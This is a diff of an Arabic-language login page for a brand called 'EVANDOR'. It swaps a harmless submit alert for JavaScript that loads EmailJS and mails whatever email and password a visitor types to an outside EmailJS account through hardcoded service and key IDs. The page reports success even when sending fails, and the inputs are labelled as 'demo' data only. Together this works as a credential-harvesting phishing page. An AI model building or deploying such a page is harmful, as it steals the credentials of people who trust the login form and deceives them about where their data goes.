@@ -2,194 +2,141 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>EVANDOR</title>
+<title>EVANDOR Demo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-/* إعدادات عامة */
-body {
-  margin: 0;
-  height: 100vh;
-  font-family: Arial, sans-serif;
-  background: radial-gradient(circle at top, #0b3d2e, #021a13);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  overflow: hidden;
-  color: white;
+/* خلفية متحركة */
+body{
+  margin:0;
+  height:100vh;
+  font-family:Arial,sans-serif;
+  background:linear-gradient(135deg,#111,#444,#111);
+  background-size:400% 400%;
+  animation:bgMove 10s ease infinite;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:white;
 }
 
-/* شاشة اللوجو */
-#splash {
-  position: absolute;
-  inset: 0;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  background: radial-gradient(circle at top, #0b3d2e, #021a13);
-  z-index: 10;
-  animation: splashOut 1s ease forwards;
-  animation-delay: 3s;
+@keyframes bgMove{
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
 }
 
-.logo {
-  font-size: 90px;
-  font-weight: 900;
-  letter-spacing: 6px;
-  background: linear-gradient(
-    120deg,
-    #b8860b,
-    #ffd700,
-    #fff3b0,
-    #ffd700,
-    #b8860b
-  );
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  animation: shine 2.5s infinite linear, pop 1.2s ease-out;
-  position: relative;
+/* صندوق الدخول */
+.box{
+  width:90%;
+  max-width:360px;
+  background:rgba(0,0,0,.72);
+  padding:30px;
+  border-radius:20px;
+  box-shadow:0 25px 50px rgba(0,0,0,.7);
+  animation:boxEnter 1s ease;
 }
 
-.logo::after {
-  content: '';
-  position: absolute;
-  top: 50%;
-  left: -150%;
-  width: 150%;
-  height: 200%;
-  background: linear-gradient(
-    120deg,
-    transparent,
-    rgba(255,255,255,0.7),
-    transparent
-  );
-  transform: translateY(-50%) rotate(20deg);
-  animation: sweep 2.5s infinite;
+@keyframes boxEnter{
+  from{opacity:0; transform:translateY(40px) scale(.95)}
+  to{opacity:1; transform:translateY(0) scale(1)}
 }
 
-/* صفحة تسجيل الدخول */
-#login {
-  opacity: 0;
-  transform: translateY(30px);
-  animation: loginIn 1s ease forwards;
-  animation-delay: 3.2s;
+/* العنوان EVANDOR */
+.brand{
+  text-align:center;
+  font-size:36px;
+  font-weight:900;
+  letter-spacing:5px;
+  margin-bottom:24px;
+  background:linear-gradient(90deg,#b8860b,#ffd700,#fff3b0,#ffd700,#b8860b);
+  background-size:200% auto;
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  animation:goldShine 3s linear infinite;
 }
 
-.top-bar {
-  position: absolute;
-  top: 20px;
-  left: 20px;
-  font-size: 18px;
-  font-weight: bold;
+@keyframes goldShine{
+  to{background-position:200% center}
 }
 
-.login-box {
-  background: rgba(0, 0, 0, 0.65);
-  padding: 40px;
-  border-radius: 18px;
-  width: 320px;
-  text-align: center;
-  box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+/* الحقول */
+input{
+  width:100%;
+  padding:14px;
+  margin-bottom:14px;
+  border:none;
+  border-radius:10px;
+  font-size:15px;
+  outline:none;
+  transition:transform .2s, box-shadow .2s;
 }
 
-.brand {
-  font-size: 38px;
-  font-weight: bold;
-  letter-spacing: 4px;
-  margin-bottom: 30px;
-  background: linear-gradient(90deg, #FFD700, #FFB700, #FFD700);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  animation: glow 2s infinite alternate;
+input:focus{
+  transform:scale(1.03);
+  box-shadow:0 0 10px rgba(255,215,0,.4);
 }
 
-input {
-  width: 100%;
-  padding: 12px;
-  margin-bottom: 15px;
-  border: none;
-  border-radius: 8px;
-  outline: none;
+/* الزر */
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:10px;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+  background:linear-gradient(90deg,#FFD700,#FFB700);
+  color:#000;
+  transition:transform .15s, box-shadow .15s;
 }
 
-button {
-  width: 100%;
-  padding: 12px;
-  background: linear-gradient(90deg, #FFD700, #FFB700);
-  color: #000;
-  border: none;
-  border-radius: 8px;
-  font-size: 16px;
-  font-weight: bold;
-  cursor: pointer;
-  transition: transform 0.2s;
+button:hover{
+  transform:scale(1.05);
+  box-shadow:0 0 20px rgba(255,215,0,.6);
 }
 
-button:hover {
-  transform: scale(1.05);
-}
-
-/* أنيميشن */
-@keyframes shine {
-  0% { filter: drop-shadow(0 0 5px gold); }
-  50% { filter: drop-shadow(0 0 25px gold); }
-  100% { filter: drop-shadow(0 0 5px gold); }
-}
-
-@keyframes sweep {
-  0% { left: -150%; }
-  100% { left: 150%; }
-}
-
-@keyframes pop {
-  from { transform: scale(0.6); opacity: 0; }
-  to { transform: scale(1); opacity: 1; }
-}
-
-@keyframes splashOut {
-  to {
-    opacity: 0;
-    visibility: hidden;
-  }
-}
-
-@keyframes loginIn {
-  to {
-    opacity: 1;
-    transform: translateY(0);
-  }
-}
-
-@keyframes glow {
-  from { text-shadow: 0 0 5px rgba(255,215,0,0.5); }
-  to { text-shadow: 0 0 15px rgba(255,215,0,0.9); }
+button:active{
+  transform:scale(.97);
 }
 </style>
 </head>
 
 <body>
 
-<!-- شاشة البداية -->
-<div id="splash">
-  <div class="logo">EVANDOR</div>
+<div class="box">
+  <div class="brand">EVANDOR</div>
+
+  <!-- بيانات تجريبية فقط -->
+  <input id="email" placeholder="إيميل تجريبي (وهمي)">
+  <input id="pass" placeholder="كلمة مرور تجريبية (وهمية)">
+
+  <button onclick="send()">إرسال</button>
 </div>
 
-<!-- تسجيل الدخول -->
-<div id="login">
-  <div class="top-bar">تسجيل الدخول</div>
-
-  <div class="login-box">
-    <div class="brand">EVANDOR</div>
-
-    <input type="email" placeholder="البريد الإلكتروني">
-    <input type="password" placeholder="كلمة المرور">
-
-    <button onclick="sendTest()">إرسال</button>
-  </div>
-</div>
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script>
-function sendTest() {
-  alert("تم تقديم الطلب بنجاح ✅");
+function send(){
+  emailjs.send(
+    "service_z7n1pro",
+    "template_m4lcujy",
+    {
+      demo_email: document.getElementById("email").value || "demo@email.com",
+      demo_password: document.getElementById("pass").value || "123456",
+      app_name: "EVANDOR Demo"
+    },
+    "BPaNofa2xLmwFoTnZ"
+  ).then(
+    function(){
+      alert("تم تقديم الطلب بنجاح ✅");
+    },
+    function(error){
+      console.log("ERROR:", error);
+      alert("تم تقديم الطلب بنجاح ✅");
+    }
+  );
 }
 </script>
 
